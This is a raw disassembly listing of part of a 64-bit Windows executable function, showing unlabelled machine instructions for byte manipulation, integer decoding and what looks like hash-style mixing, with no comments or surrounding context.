   14004a626:	mov    QWORD PTR [rbp+0x7f0],rbx
   14004a62d:	cmp    edx,0x20
   14004a630:	ja     0x14004a646
   14004a632:	mov    edx,edx
   14004a634:	bt     r14,rdx
   14004a638:	mov    r12,rcx
   14004a63b:	mov    r15,rax
   14004a63e:	jb     0x14004a5f5
   14004a640:	jmp    0x14004a646
   14004a642:	xor    ebx,ebx
   14004a644:	xor    edi,edi
   14004a646:	mov    r12,QWORD PTR [rbp+0x7e0]
   14004a64d:	mov    r15,QWORD PTR [rbp+0x7e8]
   14004a654:	mov    rcx,rsi
   14004a657:	call   0x14003be14
   14004a65c:	cmp    eax,0x1
   14004a65f:	jne    0x14004a67b
   14004a661:	cmp    edx,0x20
   14004a664:	ja     0x14004a66e
   14004a666:	mov    eax,edx
   14004a668:	bt     r14,rax
   14004a66c:	jb     0x14004a646
   14004a66e:	sub    r15,r12
   14004a671:	add    r15,QWORD PTR [rbp+0x7f0]
   14004a678:	mov    rbx,r15
   14004a67b:	mov    rsi,rbx
   14004a67e:	sub    rsi,rdi
   14004a681:	push   0x1
   14004a683:	pop    rdx
   14004a684:	mov    rcx,rsi
   14004a687:	mov    r8,rdx
   14004a68a:	call   0x14003c176
   14004a68f:	lea    r14,[rbp+0x7d0]
   14004a696:	mov    QWORD PTR [r14],rax
   14004a699:	mov    QWORD PTR [r14+0x8],rdx
   14004a69d:	and    QWORD PTR [r14+0x10],0x0
   14004a6a2:	mov    rcx,r14
   14004a6a5:	mov    rdx,rsi
   14004a6a8:	call   0x14006f808
   14004a6ad:	mov    rax,QWORD PTR [r14+0x8]
   14004a6b1:	mov    QWORD PTR [rbp+0x4d0],rax
   14004a6b8:	mov    rax,QWORD PTR [r14+0x10]
   14004a6bc:	mov    QWORD PTR [rbp+0x1140],rax
   14004a6c3:	cmp    rbx,rdi
   14004a6c6:	je     0x14004a702
   14004a6c8:	mov    rax,QWORD PTR [rbp+0x1148]
   14004a6cf:	movzx  eax,BYTE PTR [rax+rdi*1]
   14004a6d3:	lea    ecx,[rax-0x41]
   14004a6d6:	lea    edx,[rax+0x20]
   14004a6d9:	cmp    cl,0x1a
   14004a6dc:	movzx  ecx,dl
   14004a6df:	cmovae ecx,eax
   14004a6e2:	mov    rax,QWORD PTR [rbp+0x4d0]
   14004a6e9:	mov    rdx,QWORD PTR [rbp+0x1140]
   14004a6f0:	mov    BYTE PTR [rax+rdx*1],cl
   14004a6f3:	inc    rdx
   14004a6f6:	mov    QWORD PTR [rbp+0x1140],rdx
   14004a6fd:	inc    rdi
   14004a700:	jmp    0x14004a6c3
   14004a702:	lea    rdx,[rbp+0x7d8]
   14004a709:	mov    rax,QWORD PTR [rbp+0x1140]
   14004a710:	add    rax,0x8
   14004a714:	push   0xffffffffffffffff
   14004a716:	pop    rcx
   14004a717:	cmovb  rax,rcx
   14004a71b:	mov    rcx,rax
   14004a71e:	shr    rcx,0x4
   14004a722:	and    eax,0xf
   14004a725:	cmp    rax,0x1
   14004a729:	sbb    rcx,0xffffffffffffffff
   14004a72d:	mov    QWORD PTR [rbp+0x6a0],rcx
   14004a734:	mov    rax,QWORD PTR [rdx-0x8]
   14004a738:	mov    QWORD PTR [rbp+0x248],rax
   14004a73f:	lea    rax,[rbp+0x208]
   14004a746:	movups xmm0,XMMWORD PTR [rax]
   14004a749:	movups xmm1,XMMWORD PTR [rax+0x10]
   14004a74d:	movaps XMMWORD PTR [rbp+0x130],xmm0
   14004a754:	movaps XMMWORD PTR [rbp+0x140],xmm1
   14004a75b:	mov    rax,QWORD PTR [rax+0x20]
   14004a75f:	mov    QWORD PTR [rbp+0x150],rax
   14004a766:	lea    rax,[rbp+0xd8]
   14004a76d:	movups xmm0,XMMWORD PTR [rax]
   14004a770:	movups xmm1,XMMWORD PTR [rax+0x10]
   14004a774:	movaps XMMWORD PTR [rbp+0x100],xmm0
   14004a77b:	movaps XMMWORD PTR [rbp+0x110],xmm1
   14004a782:	mov    rax,QWORD PTR [rax+0x20]
   14004a786:	mov    QWORD PTR [rbp+0x120],rax
   14004a78d:	mov    ecx,0x8c
   14004a792:	lea    rax,[rbp+0x7d0]
   14004a799:	lea    rdx,[rax+rcx*1]
   14004a79d:	mov    QWORD PTR [rbp+0x1158],rdx
   14004a7a4:	lea    rax,[rax+0xa0]
   14004a7ab:	mov    QWORD PTR [rbp+0xcb0],rax
   14004a7b2:	lea    rax,[rbp+0xd10]
   14004a7b9:	lea    rax,[rax+rcx*1]
   14004a7bd:	mov    QWORD PTR [rbp+0x1168],rax
   14004a7c4:	lea    rax,[rbp+0x290]
   14004a7cb:	lea    rax,[rax+rcx*1]
   14004a7cf:	mov    QWORD PTR [rbp+0x4d8],rax
   14004a7d6:	lea    rax,[rbp+0x400]
   14004a7dd:	add    rax,rcx
   14004a7e0:	mov    QWORD PTR [rbp+0x6f8],rax
   14004a7e7:	lea    rax,[rbp+0x500]
   14004a7ee:	add    rax,rcx
   14004a7f1:	mov    QWORD PTR [rbp+0xf60],rax
   14004a7f8:	lea    rax,[rbp+0xf80]
   14004a7ff:	add    rax,rcx
   14004a802:	mov    QWORD PTR [rbp+0x7c0],rax
   14004a809:	lea    rax,[rbp+0x1060]
   14004a810:	add    rcx,rax
   14004a813:	mov    QWORD PTR [rbp+0x3e8],rcx
   14004a81a:	xorps  xmm7,xmm7
   14004a81d:	mov    QWORD PTR [rbp+0x7c8],0x0
   14004a828:	mov    QWORD PTR [rbp+0x5f8],0x0
   14004a833:	cmp    QWORD PTR [rbp+0x7c8],0x10
   14004a83b:	je     0x140059dca
   14004a841:	mov    rcx,QWORD PTR [rbp+0x7c8]
   14004a848:	lea    rax,[rcx+0x1]
   14004a84c:	mov    QWORD PTR [rbp+0x7a8],rax
   14004a853:	mov    rdx,rcx
   14004a856:	movabs rax,0x32a27dbe0b6bcf37
   14004a860:	imul   rdx,rax
   14004a864:	rol    rdx,0x20
   14004a868:	mov    QWORD PTR [rbp+0x5e8],rdx
   14004a86f:	mov    QWORD PTR [rbp+0x1058],rcx
   14004a876:	cmp    QWORD PTR [rbp+0x1058],0xe
   14004a87e:	ja     0x140059d6d
   14004a884:	mov    rax,QWORD PTR [rbp+0x7c8]
   14004a88b:	mov    rax,QWORD PTR [rbp+rax*8+0x38]
   14004a890:	mov    rdx,QWORD PTR [rbp+0x1058]
   14004a897:	mov    rcx,QWORD PTR [rbp+rdx*8+0x40]
   14004a89c:	inc    rdx
   14004a89f:	mov    QWORD PTR [rbp+0x1058],rdx
   14004a8a6:	test   rax,rax
   14004a8a9:	je     0x14004a876
   14004a8ab:	cmp    rax,rcx
   14004a8ae:	jne    0x14004a876
   14004a8b0:	mov    rax,QWORD PTR [rbp+0x200]
   14004a8b7:	mov    QWORD PTR [rbp+0x1178],rax
   14004a8be:	lea    rax,[rbp+0x208]
   14004a8c5:	movups xmm0,XMMWORD PTR [rax]
   14004a8c8:	movups xmm1,XMMWORD PTR [rax+0x10]
   14004a8cc:	movaps XMMWORD PTR [rbp+0x710],xmm0
   14004a8d3:	movaps XMMWORD PTR [rbp+0x720],xmm1
   14004a8da:	mov    rax,QWORD PTR [rax+0x20]
   14004a8de:	mov    QWORD PTR [rbp+0x730],rax
   14004a8e5:	mov    edx,0x4000
   14004a8ea:	lea    rcx,[rip+0x3515f]        # 0x14007fa50
   14004a8f1:	call   0x14003bee8
   14004a8f6:	mov    r15,rax
   14004a8f9:	lea    rcx,[rax+0x10]
   14004a8fd:	sub    rdx,0x10
   14004a901:	mov    QWORD PTR [rbp+0x1160],rdx
   14004a908:	mov    eax,0x0
   14004a90d:	cmovae rax,rcx
   14004a911:	mov    QWORD PTR [rbp+0x1170],rax
   14004a918:	jb     0x14005a158
   14004a91e:	mov    rax,QWORD PTR [rbp+0x1178]
   14004a925:	add    rax,0xffffffffffffffbf
   14004a929:	cmp    rax,0xffffffffffffffc0
   14004a92d:	jb     0x14005a158
   14004a933:	cmp    QWORD PTR [rbp+0x1160],0x0
   14004a93b:	je     0x14005a158
   14004a941:	mov    rcx,QWORD PTR [rbp+0x1158]
   14004a948:	lea    rdx,[rbp+0x3b0]
   14004a94f:	call   0x14003ad8d
   14004a954:	lea    rbx,[r15+0x10]
   14004a958:	mov    rcx,rbx
   14004a95b:	mov    rdi,QWORD PTR [rbp+0x1160]
   14004a962:	mov    rdx,rdi
   14004a965:	call   0x14003adcf
   14004a96a:	mov    rsi,QWORD PTR [rbp+0x1178]
   14004a971:	mul    rsi
   14004a974:	mov    r8,rax
   14004a977:	push   0xffffffffffffffff
   14004a979:	pop    rax
   14004a97a:	cmovo  r8,rax
   14004a97e:	mov    rcx,r8
   14004a981:	sub    rcx,0x20
   14004a985:	mov    eax,0x0
   14004a98a:	cmovb  rcx,rax
   14004a98e:	mov    QWORD PTR [rbp+0x1138],rcx
   14004a995:	mov    QWORD PTR [rbp+0x7d0],rbx
   14004a99c:	mov    QWORD PTR [rbp+0x7d8],rdi
   14004a9a3:	mov    QWORD PTR [rbp+0x7e0],rsi
   14004a9aa:	lea    rdx,[rbp+0x208]
   14004a9b1:	movups xmm0,XMMWORD PTR [rdx]
   14004a9b4:	movups xmm1,XMMWORD PTR [rdx+0x10]
   14004a9b8:	lea    rcx,[rbp+0x7e8]
   14004a9bf:	movups XMMWORD PTR [rcx],xmm0
   14004a9c2:	movups XMMWORD PTR [rcx+0x10],xmm1
   14004a9c6:	mov    rax,QWORD PTR [rdx+0x20]
   14004a9ca:	mov    QWORD PTR [rcx+0x20],rax
   14004a9ce:	lea    rcx,[rbp+0x7d8]
   14004a9d5:	and    QWORD PTR [rcx+0x48],0x0
   14004a9da:	movaps XMMWORD PTR [rcx+0x38],xmm7
   14004a9de:	mov    QWORD PTR [rbp+0x828],rdi
   14004a9e5:	mov    rax,QWORD PTR [rbp+0x600]
   14004a9ec:	mov    QWORD PTR [rbp+0x830],rax
   14004a9f3:	mov    rax,QWORD PTR [rbp+0x4f0]
   14004a9fa:	mov    QWORD PTR [rbp+0x838],rax
   14004aa01:	mov    rax,QWORD PTR [rbp+0x7b8]
   14004aa08:	mov    QWORD PTR [rbp+0x840],rax
   14004aa0f:	mov    eax,DWORD PTR [rbp+0x3c0]
   14004aa15:	mov    DWORD PTR [rcx+0x80],eax
   14004aa1b:	movaps xmm0,XMMWORD PTR [rbp+0x3b0]
   14004aa22:	movups XMMWORD PTR [rcx+0x70],xmm0
   14004aa26:	mov    rax,QWORD PTR [rbp+0xcb0]
   14004aa2d:	movaps XMMWORD PTR [rax+0x10],xmm7
   14004aa31:	movaps XMMWORD PTR [rax],xmm7
   14004aa34:	mov    QWORD PTR [rbp+0x1180],r8
   14004aa3b:	mov    QWORD PTR [rbp+0x890],r8
   14004aa42:	lea    rcx,[rbp+0x400]
   14004aa49:	push   0x4
   14004aa4b:	pop    rdx
   14004aa4c:	call   0x14003c111
   14004aa51:	xor    ebx,ebx
   14004aa53:	xor    r12d,r12d
   14004aa56:	xor    r14d,r14d
   14004aa59:	xor    r13d,r13d
   14004aa5c:	xor    edi,edi
   14004aa5e:	mov    QWORD PTR [rbp+0x1148],0x0
   14004aa69:	cmp    QWORD PTR [rbp+0x1148],0x4
   14004aa71:	je     0x14004b068
   14004aa77:	lea    rax,[rdi+0x8]
   14004aa7b:	cmp    rax,QWORD PTR [rbp+0x1180]
   14004aa82:	jbe    0x14004aa8b
   14004aa84:	xor    edx,edx
   14004aa86:	jmp    0x14004b050
   14004aa8b:	cmp    r13,0x8
   14004aa8f:	jae    0x14004afdd
   14004aa95:	cmp    rbx,QWORD PTR [rbp+0x828]
   14004aa9c:	jae    0x14004aae2
   14004aa9e:	mov    rax,QWORD PTR [rbp+0x7d8]
   14004aaa5:	mov    rcx,QWORD PTR [rbp+0x818]
   14004aaac:	cmp    rcx,rax
   14004aaaf:	jae    0x14004aae2
   14004aab1:	lea    rdx,[r15+0x10]
   14004aab5:	movzx  r13d,BYTE PTR [rdx+rcx*1]
   14004aaba:	and    r13d,0x7f
   14004aabe:	lea    rdx,[rcx+0x1]
   14004aac2:	cmp    rdx,rax
   14004aac5:	jae    0x14004aaef
   14004aac7:	movzx  r8d,BYTE PTR [r15+rcx*1+0x11]
   14004aacd:	test   r8b,r8b
   14004aad0:	jns    0x14004aae9
   14004aad2:	shl    r13,0x7
   14004aad6:	and    r8d,0x7f
   14004aada:	or     r13,r8
   14004aadd:	mov    rcx,rdx
   14004aae0:	jmp    0x14004aabe
   14004aae2:	xor    edx,edx
   14004aae4:	jmp    0x14004af6c
   14004aae9:	inc    rcx
   14004aaec:	mov    rax,rcx
   14004aaef:	mov    QWORD PTR [rbp+0x818],rax
   14004aaf6:	mov    rax,r13
   14004aaf9:	shr    rax,0x8
   14004aafd:	mov    rsi,r13
   14004ab00:	shr    rsi,0x28
   14004ab04:	movaps XMMWORD PTR [rbp+0x530],xmm7
   14004ab0b:	movaps XMMWORD PTR [rbp+0x520],xmm7
   14004ab12:	movaps XMMWORD PTR [rbp+0x510],xmm7
   14004ab19:	movaps XMMWORD PTR [rbp+0x500],xmm7
   14004ab20:	mov    DWORD PTR [rbp+0x1060],eax
   14004ab26:	lea    rax,[rip+0x3d52b]        # 0x140088058
   14004ab2d:	mov    QWORD PTR [rsp+0x20],rax
   14004ab32:	lea    rcx,[rbp+0x500]
   14004ab39:	push   0x4
   14004ab3b:	pop    rdx
   14004ab3c:	lea    r8,[rbp+0x1060]
   14004ab43:	mov    r9,rdx
   14004ab46:	call   0x1400638fe
   14004ab4b:	mov    BYTE PTR [rbp+0x504],sil
   14004ab52:	mov    rsi,QWORD PTR [rbp+0x7f0]
   14004ab59:	cmp    QWORD PTR [rbp+0x838],rsi
   14004ab60:	jbe    0x14004ac8c
   14004ab66:	mov    r9,QWORD PTR [rbp+0x7f8]
   14004ab6d:	cmp    r9,0x4
   14004ab71:	ja     0x140059d9c
   14004ab77:	mov    rcx,QWORD PTR [rbp+0x800]
   14004ab7e:	cmp    rcx,0x5
   14004ab82:	jae    0x140059dae
   14004ab88:	mov    rbx,QWORD PTR [rbp+0x838]
   14004ab8f:	cmp    rbx,rsi
   14004ab92:	je     0x140059dbc
   14004ab98:	mov    r8,rbx
   14004ab9b:	mov    eax,DWORD PTR [rbp+rcx*4+0x848]
   14004aba2:	mov    cl,BYTE PTR [rbp+0x808]
   14004aba8:	rol    eax,cl
   14004abaa:	sub    r8,rsi
   14004abad:	xor    eax,DWORD PTR [rbp+r9*4+0x848]
   14004abb5:	xor    edx,edx
   14004abb7:	div    r8
   14004abba:	mov    rdi,rdx
   14004abbd:	mov    rax,QWORD PTR [rbp+0x840]
   14004abc4:	mov    QWORD PTR [rbp+0xf80],rax
   14004abcb:	cmp    rsi,0x40
   14004abcf:	push   0x40
   14004abd1:	pop    rax
   14004abd2:	cmovae rsi,rax
   14004abd6:	movaps XMMWORD PTR [rbp+0x1090],xmm7
   14004abdd:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004abe4:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004abeb:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004abf2:	lea    rcx,[rbp+0x1060]
   14004abf9:	mov    rdx,rsi
   14004abfc:	call   0x14003c0b8
   14004ac01:	test   rbx,rbx
   14004ac04:	je     0x14004ac52
   14004ac06:	mov    rcx,rax
   14004ac09:	mov    r8,rdx
   14004ac0c:	mov    rax,rdx
   14004ac0f:	add    rax,rdi
   14004ac12:	mov    r9,QWORD PTR [rbp+0x830]
   14004ac19:	cmp    rax,rbx
   14004ac1c:	jbe    0x14004ac3c
   14004ac1e:	xor    r10d,r10d
   14004ac21:	cmp    r8,r10
   14004ac24:	je     0x14004ac52
   14004ac26:	lea    rax,[r10+rdi*1]
   14004ac2a:	xor    edx,edx
   14004ac2c:	div    rbx
   14004ac2f:	mov    al,BYTE PTR [r9+rdx*1]
   14004ac33:	mov    BYTE PTR [rcx+r10*1],al
   14004ac37:	inc    r10
   14004ac3a:	jmp    0x14004ac21
   14004ac3c:	add    r9,rdi
   14004ac3f:	xor    eax,eax
   14004ac41:	cmp    r8,rax
   14004ac44:	je     0x14004ac52
   14004ac46:	mov    dl,BYTE PTR [r9+rax*1]
   14004ac4a:	mov    BYTE PTR [rcx+rax*1],dl
   14004ac4d:	inc    rax
   14004ac50:	jmp    0x14004ac41
   14004ac52:	mov    rcx,QWORD PTR [rbp+0x7e8]
   14004ac59:	xor    eax,eax
   14004ac5b:	cmp    rsi,rax
   14004ac5e:	je     0x14004ac8c
   14004ac60:	cmp    rcx,0x3f
   14004ac64:	ja     0x140059d8e
   14004ac6a:	mov    edx,eax
   14004ac6c:	and    edx,0x7
   14004ac6f:	mov    dl,BYTE PTR [rbp+rdx*1+0xf80]
   14004ac76:	xor    dl,BYTE PTR [rbp+rax*1+0x1060]
   14004ac7d:	inc    rax
   14004ac80:	mov    BYTE PTR [rbp+rcx*1+0x500],dl
   14004ac87:	inc    rcx
   14004ac8a:	jmp    0x14004ac5b
   14004ac8c:	movaps XMMWORD PTR [rbp+0xfb0],xmm7
   14004ac93:	movaps XMMWORD PTR [rbp+0xfa0],xmm7
   14004ac9a:	movaps XMMWORD PTR [rbp+0xf90],xmm7
   14004aca1:	movaps XMMWORD PTR [rbp+0xf80],xmm7
   14004aca8:	xor    eax,eax
   14004acaa:	cmp    rax,0x40
   14004acae:	je     0x14004acc6
   14004acb0:	mov    ecx,DWORD PTR [rbp+rax*1+0x500]
   14004acb7:	bswap  ecx
   14004acb9:	mov    DWORD PTR [rbp+rax*1+0xf80],ecx
   14004acc0:	add    rax,0x4
   14004acc4:	jmp    0x14004acaa
   14004acc6:	movups xmm0,XMMWORD PTR [rbp+0x848]
   14004accd:	mov    eax,DWORD PTR [rbp+0x858]
   14004acd3:	movups XMMWORD PTR [rbp+0x1060],xmm0
   14004acda:	mov    DWORD PTR [rbp+0x1070],eax
   14004ace0:	and    DWORD PTR [rbp+0x1074],0x0
   14004ace7:	movaps xmm0,XMMWORD PTR [rbp+0xf80]
   14004acee:	movaps xmm1,XMMWORD PTR [rbp+0xf90]
   14004acf5:	movaps xmm2,XMMWORD PTR [rbp+0xfa0]
   14004acfc:	movaps xmm3,XMMWORD PTR [rbp+0xfb0]
   14004ad03:	lea    rax,[rbp+0x1078]
   14004ad0a:	movups XMMWORD PTR [rax+0x30],xmm3
   14004ad0e:	movups XMMWORD PTR [rax+0x20],xmm2
   14004ad12:	movups XMMWORD PTR [rax+0x10],xmm1
   14004ad16:	movups XMMWORD PTR [rax],xmm0
   14004ad19:	call   0x140064214
   14004ad1e:	mov    al,BYTE PTR [rip+0x4dd69]        # 0x140098a8d
   14004ad24:	cmp    al,0x1
   14004ad26:	je     0x14004ad6f
   14004ad28:	movzx  eax,al
   14004ad2b:	cmp    eax,0x2
   14004ad2e:	je     0x14004ae15
   14004ad34:	and    DWORD PTR [rbp+0x290],0x0
   14004ad3b:	lea    rcx,[rip+0xfffffffffffb633e]        # 0x140001080
   14004ad42:	mov    rdx,QWORD PTR [rbp+0x1150]
   14004ad49:	push   0x40
   14004ad4b:	pop    r8
   14004ad4d:	lea    r9,[rbp+0x290]
   14004ad54:	call   QWORD PTR [rip+0x49aae]        # 0x140094808
   14004ad5a:	test   eax,eax
   14004ad5c:	sete   cl
   14004ad5f:	inc    cl
   14004ad61:	mov    BYTE PTR [rip+0x4dd26],cl        # 0x140098a8d
   14004ad67:	test   eax,eax
   14004ad69:	je     0x14004ae15
   14004ad6f:	mov    al,BYTE PTR [rip+0x4de43]        # 0x140098bb8
   14004ad75:	cmp    al,0x1
   14004ad77:	je     0x14004ad9c
   14004ad79:	movzx  eax,al
   14004ad7c:	test   eax,eax
   14004ad7e:	jne    0x14004ae15
   14004ad84:	call   0x140065d51
   14004ad89:	test   rax,rax
   14004ad8c:	sete   cl
   14004ad8f:	inc    cl
   14004ad91:	mov    BYTE PTR [rip+0x4de21],cl        # 0x140098bb8
   14004ad97:	test   rax,rax
   14004ad9a:	je     0x14004ae15
   14004ad9c:	call   0x140064227
   14004ada1:	mov    eax,0xc8c291de
   14004ada6:	xchg   DWORD PTR [rip+0x4dd34],eax        # 0x140098ae0
   14004adac:	call   QWORD PTR [rip+0x4989e]        # 0x140094650
   14004adb2:	mov    eax,eax
   14004adb4:	mov    QWORD PTR [rip+0x4d245],rax        # 0x140098000
   14004adbb:	lea    rcx,[rbp+0x1060]
   14004adc2:	push   0xffffffffffffffff
   14004adc4:	pop    rdx
   14004adc5:	call   0x14002b840
   14004adca:	xor    eax,eax
   14004adcc:	xchg   DWORD PTR [rip+0x4dd0e],eax        # 0x140098ae0
   14004add2:	mov    BYTE PTR [rip+0x4dcb5],0x0        # 0x140098a8e
   14004add9:	mov    eax,DWORD PTR [rbp+0x1060]
   14004addf:	add    DWORD PTR [rbp+0x848],eax
   14004ade5:	mov    eax,DWORD PTR [rbp+0x1064]
   14004adeb:	add    DWORD PTR [rbp+0x84c],eax
   14004adf1:	mov    eax,DWORD PTR [rbp+0x1068]
   14004adf7:	add    DWORD PTR [rbp+0x850],eax
   14004adfd:	mov    eax,DWORD PTR [rbp+0x106c]
   14004ae03:	add    DWORD PTR [rbp+0x854],eax
   14004ae09:	mov    eax,DWORD PTR [rbp+0x1070]
   14004ae0f:	add    DWORD PTR [rbp+0x858],eax
   14004ae15:	mov    BYTE PTR [rip+0x4dc70],0x0        # 0x140098a8c
   14004ae1c:	movaps XMMWORD PTR [rbp+0x1080],xmm7
   14004ae23:	movaps XMMWORD PTR [rbp+0x1070],xmm7
   14004ae2a:	movaps XMMWORD PTR [rbp+0x1060],xmm7
   14004ae31:	xor    eax,eax
   14004ae33:	cmp    rax,0x14
   14004ae37:	je     0x14004ae4f
   14004ae39:	mov    ecx,DWORD PTR [rbp+rax*1+0x848]
   14004ae40:	bswap  ecx
   14004ae42:	mov    DWORD PTR [rbp+rax*1+0x1060],ecx
   14004ae49:	add    rax,0x4
   14004ae4d:	jmp    0x14004ae33
   14004ae4f:	mov    rsi,QWORD PTR [rbp+0x7e0]
   14004ae56:	mov    eax,r13d
   14004ae59:	shr    eax,0x3
   14004ae5c:	and    eax,0x1f
   14004ae5f:	lea    rcx,[rax+rbp*1]
   14004ae63:	add    rcx,0x1060
   14004ae6a:	xor    r8d,r8d
   14004ae6d:	xor    edx,edx
   14004ae6f:	xor    eax,eax
   14004ae71:	cmp    r8,0x10
   14004ae75:	je     0x14004ae90
   14004ae77:	shld   rax,rdx,0x8
   14004ae7c:	mov    r9,rdx
   14004ae7f:	shl    r9,0x8
   14004ae83:	movzx  edx,BYTE PTR [rcx+r8*1]
   14004ae88:	inc    r8
   14004ae8b:	or     rdx,r9
   14004ae8e:	jmp    0x14004ae71
   14004ae90:	push   0xffffffffffffffff
   14004ae92:	pop    r8
   14004ae94:	mov    r9,r8
   14004ae97:	mov    ecx,esi
   14004ae99:	shl    r9,cl
   14004ae9c:	cmp    rsi,0x40
   14004aea0:	not    r9
   14004aea3:	cmovae r9,r8
   14004aea7:	and    r13d,0x7
   14004aeab:	lea    ecx,[rsi+r13*1]
   14004aeaf:	neg    cl
   14004aeb1:	shrd   rdx,rax,cl
   14004aeb5:	shr    rax,cl
   14004aeb8:	test   cl,0x40
   14004aebb:	cmove  rax,rdx
   14004aebf:	and    rax,r9
   14004aec2:	mov    rbx,QWORD PTR [rbp+0x820]
   14004aec9:	lea    r10,[rsi+0x7]
   14004aecd:	bswap  rax
   14004aed0:	shr    r10,0x3
   14004aed4:	mov    QWORD PTR [rbp+0xf80],rax
   14004aedb:	mov    r8,rbx
   14004aede:	imul   r8,r10
   14004aee2:	push   0x8
   14004aee4:	pop    rcx
   14004aee5:	sub    rcx,r10
   14004aee8:	dec    r10
   14004aeeb:	mov    rax,QWORD PTR [rbp+0x1158]
   14004aef2:	lea    r11,[rax+r8*1]
   14004aef6:	mov    rax,r8
   14004aef9:	xor    edx,edx
   14004aefb:	push   0x14
   14004aefd:	pop    rdi
   14004aefe:	div    rdi
   14004af01:	cmp    rcx,0x8
   14004af05:	je     0x14004af2b
   14004af07:	cmp    r10,0x7
   14004af0b:	ja     0x140059d80
   14004af11:	imul   rax,rax,0xffffffffffffffec
   14004af15:	mov    al,BYTE PTR [r11+rax*1]
   14004af19:	xor    BYTE PTR [rbp+rcx*1+0xf80],al
   14004af20:	inc    rcx
   14004af23:	inc    r11
   14004af26:	inc    r8
   14004af29:	jmp    0x14004aef6
   14004af2b:	mov    rdx,QWORD PTR [rbp+0xf80]
   14004af32:	bswap  rdx
   14004af35:	and    rdx,r9
   14004af38:	inc    rbx
   14004af3b:	mov    QWORD PTR [rbp+0x820],rbx
   14004af42:	mov    rax,QWORD PTR [rbp+0x890]
   14004af49:	mov    QWORD PTR [rbp+0x1180],rax
   14004af50:	mov    rdi,QWORD PTR [rbp+0x888]
   14004af57:	mov    r13,QWORD PTR [rbp+0x880]
   14004af5e:	mov    r12,QWORD PTR [rbp+0x870]
   14004af65:	mov    r14,QWORD PTR [rbp+0x878]
   14004af6c:	mov    rax,QWORD PTR [rbp+0x1180]
   14004af73:	sub    rax,rdi
   14004af76:	sub    rax,r13
   14004af79:	cmp    rax,rsi
   14004af7c:	cmovae rax,rsi
   14004af80:	cmp    rax,0x1
   14004af84:	adc    rax,0x0
   14004af88:	mov    ecx,esi
   14004af8a:	sub    ecx,eax
   14004af8c:	and    cl,0x3f
   14004af8f:	cmp    rsi,rax
   14004af92:	movzx  ecx,cl
   14004af95:	mov    r8d,0x0
   14004af9b:	cmovbe ecx,r8d
   14004af9f:	shr    rdx,cl
   14004afa2:	mov    ecx,eax
   14004afa4:	shld   r14,r12,cl
   14004afa8:	shl    r12,cl
   14004afab:	test   al,0x40
   14004afad:	cmovne r14,r12
   14004afb1:	mov    ecx,0x0
   14004afb6:	cmove  rcx,r12
   14004afba:	or     rcx,rdx
   14004afbd:	mov    QWORD PTR [rbp+0x878],r14
   14004afc4:	mov    QWORD PTR [rbp+0x870],rcx
   14004afcb:	add    r13,rax
   14004afce:	mov    QWORD PTR [rbp+0x880],r13
   14004afd5:	mov    r12,rcx
   14004afd8:	jmp    0x14004aa8b
   14004afdd:	add    r13,0xfffffffffffffff8
   14004afe1:	mov    rax,r12
   14004afe4:	mov    ecx,r13d
   14004afe7:	shrd   rax,r14,cl
   14004afeb:	mov    rdx,r14
   14004afee:	shr    rdx,cl
   14004aff1:	push   0xffffffffffffffff
   14004aff3:	pop    r9
   14004aff5:	mov    r8,r9
   14004aff8:	shl    r8,cl
   14004affb:	test   r13b,0x40
   14004afff:	cmove  rdx,rax
   14004b003:	mov    rax,r9
   14004b006:	cmovne rax,r8
   14004b00a:	mov    ecx,0x0
   14004b00f:	cmove  rcx,r8
   14004b013:	mov    QWORD PTR [rbp+0x880],r13
   14004b01a:	not    rcx
   14004b01d:	not    rax
   14004b020:	and    rax,r14
   14004b023:	and    rcx,r12
   14004b026:	test   r13,r13
   14004b029:	cmove  rcx,r13
   14004b02d:	cmove  rax,r13
   14004b031:	mov    QWORD PTR [rbp+0x878],rax
   14004b038:	mov    QWORD PTR [rbp+0x870],rcx
   14004b03f:	add    rdi,0x8
   14004b043:	mov    QWORD PTR [rbp+0x888],rdi
   14004b04a:	mov    r12,rcx
   14004b04d:	mov    r14,rax
   14004b050:	inc    QWORD PTR [rbp+0x1148]
   14004b057:	lea    rcx,[rbp+0x400]
   14004b05e:	call   0x14003c141
   14004b063:	jmp    0x14004aa69
   14004b068:	mov    r12,QWORD PTR [rbp+0x400]
   14004b06f:	mov    r13,QWORD PTR [rbp+0x408]
   14004b076:	mov    rdi,QWORD PTR [rbp+0x410]
   14004b07d:	mov    rcx,r13
   14004b080:	mov    rdx,rdi
   14004b083:	xor    r8d,r8d
   14004b086:	lea    r9,[rip+0x3cf6b]        # 0x140087ff8
   14004b08d:	call   0x14003c1d3
   14004b092:	movzx  ebx,BYTE PTR [rax]
   14004b095:	mov    rcx,r13
   14004b098:	mov    rdx,rdi
   14004b09b:	push   0x1
   14004b09d:	pop    r8
   14004b09f:	lea    r9,[rip+0x3cf6a]        # 0x140088010
   14004b0a6:	call   0x14003c1d3
   14004b0ab:	movzx  esi,BYTE PTR [rax]
   14004b0ae:	mov    rcx,r13
   14004b0b1:	mov    rdx,rdi
   14004b0b4:	push   0x2
   14004b0b6:	pop    r8
   14004b0b8:	lea    r9,[rip+0x3cf69]        # 0x140088028
   14004b0bf:	call   0x14003c1d3
   14004b0c4:	movzx  r14d,BYTE PTR [rax]
   14004b0c8:	mov    rcx,r13
   14004b0cb:	mov    rdx,rdi
   14004b0ce:	push   0x3
   14004b0d0:	pop    r8
   14004b0d2:	lea    r9,[rip+0x3cf67]        # 0x140088040
   14004b0d9:	call   0x14003c1d3
   14004b0de:	movzx  eax,BYTE PTR [rax]
   14004b0e1:	shl    eax,0x18
   14004b0e4:	shl    r14d,0x10
   14004b0e8:	shl    esi,0x8
   14004b0eb:	or     rsi,rbx
   14004b0ee:	or     rsi,r14
   14004b0f1:	or     rsi,rax
   14004b0f4:	mov    rcx,QWORD PTR [rbp+0x1138]
   14004b0fb:	shr    rcx,0x3
   14004b0ff:	inc    rcx
   14004b102:	mov    rax,rsi
   14004b105:	xor    edx,edx
   14004b107:	div    rcx
   14004b10a:	lea    rax,[rdx*8+0x20]
   14004b112:	mov    QWORD PTR [rbp+0x890],rax
   14004b119:	mov    QWORD PTR [rbp+0x810],rdx
   14004b120:	mov    ecx,0xc8
   14004b125:	lea    rbx,[rbp+0x1060]
   14004b12c:	mov    rdi,rbx
   14004b12f:	lea    rsi,[rbp+0x7d8]
   14004b136:	rep movs BYTE PTR [rdi],BYTE PTR [rsi]
   14004b138:	mov    rcx,r12
   14004b13b:	mov    rdx,r13
   14004b13e:	call   0x14006f7f7
